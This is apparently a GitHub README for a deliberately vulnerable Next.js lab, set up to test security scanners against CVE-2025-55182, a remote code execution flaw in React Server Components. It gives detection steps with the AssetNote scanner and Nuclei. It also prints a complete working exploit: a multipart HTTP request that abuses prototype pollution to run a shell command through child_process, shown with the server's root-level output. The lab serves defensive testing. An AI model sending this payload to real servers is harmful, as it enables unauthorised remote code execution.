# React2Shell PoC

This repository provides a minimal intentionally vulnerable environment to test security scanners against the recent critical RCE vulnerability (React2Shell) affecting React Server Components and Next.js.

> **[CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)**: A pre-authentication remote code execution vulnerability exists in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack. The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints.

> **[CVE-2025-66478](https://nextjs.org/blog/CVE-2025-66478)**: Tracks the downstream impact on Next.js applications using the App Router.

> [!Warning] 
> This setup is intentionally vulnerable and must never be exposed to the public internet or used in production.

---

## What is this

This app is a very small Next.js project that:

- Pins **vulnerable versions** of:
  - `next`: `16.0.6`
  - `react`: `19.2.0`
  - `react-dom`: `19.2.0`
- Uses a minimal NextJS config with app router and React server actions

> [!TIP]
> Pinning `react` and `react-dom` is optional, as an affected `next` version is susceptible per default due to app router.

## How to run

```bash
docker run --rm -p 127.0.0.1:3000:3000 ghcr.io/l4rm4nd/cve-2025-55182:latest
```

## How to detect

### AssetNote Scanner

Use the scanner provided by AssetNote:

```bash
git clone https://github.com/assetnote/react2shell-scanner && cd react2shell-scanner
virtualenv venv && source venv/bin/activate && pip install -r requirements.txt

python3 scanner.py -u http://127.0.0.1:3000
```
Will return:

```bash
╰─(venv) ⠠⠵ python3 scanner.py -u http://127.0.0.1:3000             

brought to you by assetnote

[*] Loaded 1 host(s) to scan
[*] Using 10 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[VULNERABLE] http://127.0.0.1:3000 - Status: 303
```

### Nuclei

```bash
nuclei -t ./nuclei-template/CVE-2025-55182.yaml -u http://127.0.0.1:3000
```

Will return:

```bash
[INF] Templates loaded for current scan: 1
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[CVE-2025-55182] [http] [critical] http://127.0.0.1:3000
```

## How to exploit

PoC HTTP payload from [here](https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478?tab=readme-ov-file#payload-that-can-see-command-execution-result-in-response-body-most-useful).

```http
POST / HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 740

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

```

Will return:

```http
HTTP/1.1 500 Internal Server Error
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
x-nextjs-cache: HIT
x-nextjs-prerender: 1
Content-Type: text/x-component
Date: Fri, 05 Dec 2025 11:53:05 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 195

0:{"a":"$@1","f":"","b":"PAoMR732SpRI6Xw9cbfbD"}
1:E{"digest":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)"}

```

<img width="1324" height="739" alt="image" src="https://github.com/user-attachments/assets/b64a6ee1-22d5-43e7-ba31-63676f915238" />

